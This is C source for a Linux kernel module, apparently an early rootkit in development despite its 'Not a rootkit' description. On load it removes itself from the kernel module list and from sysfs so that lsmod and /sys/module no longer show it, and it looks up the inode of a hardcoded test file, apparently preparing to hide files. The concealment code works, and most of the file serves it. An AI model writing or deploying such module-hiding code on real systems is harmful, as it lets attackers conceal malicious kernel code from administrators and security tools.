#include <linux/init.h>
#include <linux/module.h>
#include <linux/path.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yanay Goor");
MODULE_DESCRIPTION("Not a rootkit");
MODULE_VERSION("0.1.0");

static struct list_head *modules;

// TODO: Provide a way for the module to control the path(s).
static const char *test_path_name = "/home/yanayg/test_file";

static void hide_module(void) {
    // Save the list for later so we can add the module back in.
	modules = THIS_MODULE->list.prev;
	// Hide from procfs (lsmod)
	// TODO: This means that rmmod will not work, I need to provide a way for the module to unload itself.
	list_del(&THIS_MODULE->list);
	// Hide from sysfs (/sys/module)
	// kobject_del removes the kobject from the sysfs but does
	// not free it's memory (that only happens one the refcount is 0).
	// So it is save to call without causing an error later on when unloading the module.
	 kobject_del(&THIS_MODULE->mkobj.kobj);
	// ???
	// THIS_MODULE->sect_attrs = NULL;
	// ???
	// THIS_MODULE->notes_attrs = NULL;
}

static void unhide_module(void) {
	// Unhide from procfs (lsmod)
	list_add(&THIS_MODULE->list, modules);
}

static int get_inode_by_path_name(const char *path_name) {
    struct inode *inode;
    struct path path;
    int retval;
    if ((retval = kern_path(path_name, LOOKUP_FOLLOW, &path))) {
        return retval;
    }
    inode = path.dentry->d_inode;
    printk("Path name: %s, inode: %lu\n", path_name, inode->i_ino);
    path_put(&path);
    return 0;
}

static int __init MRK_initialize(void) {
	int retval;
	hide_module();
	if ((retval = get_inode_by_path_name(test_path_name))) {
	    return retval;
	}
	printk(KERN_INFO "Hello, World!\n");
	return 0;
}


static void __exit MRK_exit(void) {
    unhide_module();
	printk(KERN_INFO "Goodbye, World!\n");
}

module_init(MRK_initialize);
module_exit(MRK_exit);
